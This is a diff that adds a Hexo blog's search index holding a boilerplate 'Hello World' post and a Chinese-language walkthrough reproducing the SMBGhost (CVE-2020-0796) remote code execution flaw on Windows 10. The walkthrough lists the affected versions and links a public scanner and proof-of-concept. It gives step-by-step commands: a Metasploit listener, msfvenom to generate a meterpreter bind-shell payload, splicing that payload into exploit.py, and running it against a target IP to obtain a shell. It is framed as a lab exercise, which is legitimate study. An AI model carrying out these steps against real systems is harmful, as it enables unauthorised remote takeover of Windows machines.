@@ -1,0 +1,96 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>Hello World</title>
+    <url>/2021/02/09/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>Windows：CVE-2020-0796 RCE 漏洞复现</title>
+    <url>/2021/02/10/Windows/Windows%EF%BC%9ACVE-2020-0796%20RCE/</url>
+    <content><![CDATA[<h2 id="一、影响范围（需关闭-Win10-防火墙）："><a href="#一、影响范围（需关闭-Win10-防火墙）：" class="headerlink" title="一、影响范围（需关闭 Win10 防火墙）："></a>一、影响范围（需关闭 Win10 防火墙）：</h2><ul>
+<li>Windows 10 Version 1903 for 32-bit Systems</li>
+<li>Windows 10 Version 1903 for ARM64-based Systems</li>
+<li>Windows 10 Version 1903 for x64-based Systems</li>
+<li>Windows 10 Version 1909 for 32-bit Systems</li>
+<li>Windows 10 Version 1909 for ARM64-based Systems</li>
+<li>Windows 10 Version 1909 for x64-based Systems</li>
+<li>Windows Server, version 1903 (Server Core installation)</li>
+<li>Windows Server, version 1909 (Server Core installation)<br>
+
+</li>
+</ul>
+<hr>
+<h2 id="二、漏洞复现："><a href="#二、漏洞复现：" class="headerlink" title="二、漏洞复现："></a>二、漏洞复现：</h2><p><strong>环境准备：</strong></p>
+<ul>
+<li>kali，ip：192.168.201.152（攻击机）</li>
+<li>受影响版本的Win10，ip：192.168.201.132（须关闭防火墙）</li>
+</ul>
+<p><strong>漏洞检测工具下载地址：</strong></p>
+<ul>
+<li><p><a href="https://github.com/ollypwn/SMBGhost">https://github.com/ollypwn/SMBGhost</a></p>
+</li>
+<li><ul>
+<li><strong>漏洞检测工具使用方法：</strong></li>
+</ul>
+</li>
+<li><ul>
+<li><code>pythone3 scanner.py 192.168.0.0/24</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>PoC下载地址：</strong></p>
+<ul>
+<li><p><a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
+</li>
+<li><ul>
+<li><strong>POC 使用方法：</strong></li>
+</ul>
+</li>
+<li><ul>
+<li><code>python3.8 exploit.py -ip 192.168.201.132</code><br>
+
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="三、漏洞复现："><a href="#三、漏洞复现：" class="headerlink" title="三、漏洞复现："></a>三、漏洞复现：</h2><p>1、先对使用kali对 9999 端口进行监听：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set lport 9999</span><br><span class="line">set rhost 192.168.201.132</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>![](Windows：CVE-2020-0796 RCE/1.png)</p>
+<p>2、kali 使用 msf 生成木马（此处端口需跟监听的端口是一致的）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;9999 -b &#39;\x00&#39; -i 1 -f python&gt;test.py</span><br></pre></td></tr></table></figure>
+<p>木马生成后的内容为：<br>![](Windows：CVE-2020-0796 RCE/2.png)</p>
+<p>下载好的 POC：<br>![](Windows：CVE-2020-0796 RCE/3.png)</p>
+<p>3、先把木马的内的 buf 替换为 USER_PAYLOAD ，再替换 exploit.py 内的 USER_PAYLOAD 行的内容</p>
+<ul>
+<li>:set nu       &emsp;&emsp;// 显示行</li>
+<li>:91,127s/buf/USER_PAYLOAD    &emsp;&emsp;// 把91-127行的 buf 替换为 USER_PAYLOAD</li>
+</ul>
+<p>![](Windows：CVE-2020-0796 RCE/4.png)</p>
+<p>4、使用 Python3 运行（在此处需按一次回车）<br>![](Windows：CVE-2020-0796 RCE/5.png)<br>![](Windows：CVE-2020-0796 RCE/6.png)</p>
+<p>5、此时监听的 9999 端口已收到访反弹的 shell</p>
+<ul>
+<li>// 如未收到反弹的 Shell 则使用 Python 重新运行一次 POC</li>
+</ul>
+<p>![](Windows：CVE-2020-0796 RCE/7.png)<br>![](Windows：CVE-2020-0796 RCE/8.png)</p>
+<hr>
+]]></content>
+      <categories>
+        <category>Windows 漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+</search>
